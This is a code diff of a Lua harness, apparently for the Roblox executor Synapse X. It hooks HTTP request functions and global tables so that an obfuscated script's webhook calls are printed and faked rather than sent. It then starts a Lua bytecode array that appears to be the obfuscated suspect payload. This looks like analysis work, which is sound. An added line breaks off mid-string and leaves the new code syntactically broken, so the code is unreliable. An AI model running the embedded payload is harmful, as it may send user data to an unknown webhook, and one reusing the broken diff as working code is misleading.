@@ -3,12 +3,21 @@
     
     -- https://discord.gg/Eb92DeZear --
 ]]
-setreadonly(syn,false)
-syn.request = function(t)
-    print('syn.request: '..t.Url) --their webhook :wholesome:
-    return{StatusMessage="OK";Success=true;StatusCode=200;Body="69.69.420.1337";Cookies={};Headers={['Connection']='keep-alive';['Content-Type']='text/plain';['Vary']='Origin';['Date']='Wed, 08 Jun 2022 20:18:31 GMT';['Via']='1.1 vegur';['Content-Length']=11;['Server']='Cowboy'}}
+do
+local _ = function(t)
+    print('http request: '..t.Url)
+    return{StatusMessage="OK";Success=true;StatusCode=200;Body="69.69.420.1337";Cookies={};Headers={['Connection']='keep-alive
 end
-setreadonly(syn,true)
+if syn then
+    setreadonly(syn,false)
+    syn.request = _
+    setreadonly(syn,true)
+else
+    http_request = _
+end
+
+end
+
 local bozo_hack = setmetatable({},{__newindex = print})
 _G = bozo_hack
 getgenv = function(...)
@@ -29,6 +38,8 @@ local VPPVtGqW = function(...)
     print('VPPVtGqW function: '.. ...)
 end
 local omnWymoCHPUb = bozo_hack
+
+-- main script
 
 local llIIlIlIIllllIlIlIlIIlIlIlIllllIllI = {'\27','\76','\117','\97','\81','\0','\1','\4','\8','\4','\8','\0','\7','\0',
 '\0','\0','\0','\0','\0','\0','\60','\101','\118','\97','\108','\62','\0','\3','\0','\0','\0','\9','\0','\0','\0','\0','\0',
